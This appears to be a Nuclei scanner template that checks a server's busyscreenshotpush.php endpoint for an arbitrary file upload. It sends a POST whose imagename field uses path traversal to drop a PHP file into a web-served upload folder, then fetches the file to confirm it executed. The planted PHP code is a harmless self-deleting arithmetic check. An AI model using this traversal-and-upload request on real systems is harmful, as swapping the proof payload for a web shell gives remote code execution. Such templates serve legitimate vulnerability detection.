id: spon-busyscreenshotpush-fileupload

info:
  name: spon-busyscreenshotpush-fileupload
  author: msk
  severity: high

variables:
  filename: "{{to_lower(rand_base(10))}}"


http:
  - raw:
      - |
        POST /php/busyscreenshotpush.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
        Content-Length: 167
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close
        Content-Type: application/x-www-form-urlencoded
        Upgrade-Insecure-Requests: 1

        jsondata[caller]=1&jsondata[callee]=1&jsondata[imagename]=..\..\..\Wnmp\WWW\upload\1_0_{{filename}}.php&jsondata[imagecontent]={{base64("<?php echo 111*111; unlink(__FILE__); ?>")}}

      - |
        GET /upload/1_0_{{filename}}.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36
        Connection: close
        Accept-Encoding: gzip


    matchers:
      - type: dsl
        dsl:
          - status_code_2==200 && contains_all(body_2,"12321")
